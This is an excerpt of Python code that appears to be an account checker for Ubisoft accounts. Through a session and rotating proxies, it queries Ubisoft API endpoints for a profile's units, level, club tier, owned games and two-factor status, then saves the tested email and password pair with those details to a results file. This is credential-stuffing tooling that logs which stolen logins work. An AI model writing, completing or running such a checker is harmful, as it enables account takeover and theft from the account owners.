        ...
        try:
            ...
            with Session() as s:
                ...
                if "Invalid credentials" in response.text:
                    ...
                    capture = s.get(
                        f"https://public-ubiservices.ubi.com/v1/profiles/club?profileIds={user_id}",
                        headers=header_2,
                    ).json()[0]
                    units = capture["units"]
                    ...
                    games = []
                    game_list = s.get(
                        f"https://wspuplay-ext.ubi.com/UplayServices/WinServices/GameClientServices.svc/REST/JSON/GetGamePlatformsByUserId/{user_id}/en-US/?onlyOwned=true&rowsCount=-1&pCodeIssuer=PC&country=EN",
                        headers=header_2,
                    ).json()["ItemList"]
                    ...
                    response = s.get(
                        "https://public-ubiservices.ubi.com/v2/profiles/me/2fa",
                        headers=header_2,
                    ).text
                    if 'active":true' in response:
                        ...
                        save(
                            ...
                            Checker.time,
                            ":".join([email, password])
                            + f" | Units: {units} | Level: {level} | Tier: {tier} | Club Member: {club_member} | Total Games: {len(games)} | Games List: {games}",
                        )
                        Checker.custom += 1
                        return_proxy(proxy)
                        return
